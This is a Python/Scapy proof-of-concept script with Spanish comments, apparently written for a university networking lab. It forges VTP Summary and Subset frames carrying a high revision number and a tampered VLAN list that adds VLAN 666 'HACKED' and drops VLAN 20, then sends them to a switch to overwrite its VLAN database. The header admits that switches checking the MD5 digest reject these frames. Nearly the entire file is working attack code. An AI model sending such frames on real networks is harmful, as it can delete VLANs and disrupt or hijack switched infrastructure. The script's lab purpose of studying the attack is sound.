#!/usr/bin/env python3
# =============================================================
#  Ataque VTP - PoC (prueba de concepto) con Scapy
#  Autor: Jonathan Sencion - Mat. 20250851 - ITLA
#
#  NOTA IMPORTANTE:
#  Las imagenes IOS/IOL que validan el digest MD5 del anuncio VTP
#  rechazan las tramas generadas sin el MD5 exacto (igual que ocurre
#  con Yersinia 0.8.2). Por eso, en el laboratorio el ataque se
#  DEMUESTRA con el metodo del switch rogue (ver rogue_vtp.cfg), que
#  es VTP real de Cisco con MD5 valido. Este PoC ilustra la
#  construccion de los anuncios VTP (Summary + Subset).
# =============================================================
from scapy.all import Dot3, LLC, SNAP, sendp
from scapy.contrib.vtp import VTP, VTPVlanInfo

IFACE   = "eth0"
DOMINIO = "ITLA"
REV     = 100                    # revision mayor a la actual del dominio
VTP_MAC = "01:00:0c:cc:cc:cc"    # multicast usado por CDP/VTP/DTP


def vlan(vid, nombre):
    return VTPVlanInfo(vlanid=vid, vlanname=nombre, status=0, type=1, mtu=1500)


# Base de datos MALICIOSA: se agrega la VLAN 666 (HACKED) y se omite la 20
base_datos = [
    vlan(1,   "default"),
    vlan(10,  "USUARIOS"),
    vlan(99,  "GESTION"),
    vlan(666, "HACKED"),
]


def trama(vtp_payload):
    return (Dot3(dst=VTP_MAC) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            SNAP(OUI=0x00000c, code=0x2003) /
            vtp_payload)


summary = VTP(ver=2, code=1, followers=1, domnamelen=len(DOMINIO),
              domname=DOMINIO, rev=REV)
subset = VTP(ver=2, code=2, seq=1, domnamelen=len(DOMINIO),
             domname=DOMINIO, rev=REV, vlaninfo=base_datos)

print("[*] Enviando anuncios VTP (Summary + Subset) por", IFACE)
sendp(trama(summary), iface=IFACE, verbose=0)
sendp(trama(subset), iface=IFACE, verbose=0)
print("[*] Enviado. Verifica con 'show vtp status' en el switch.")
print("[!] Si la revision NO cambia, el switch valida MD5: usa el")
print("    metodo del switch rogue (rogue_vtp.cfg).")
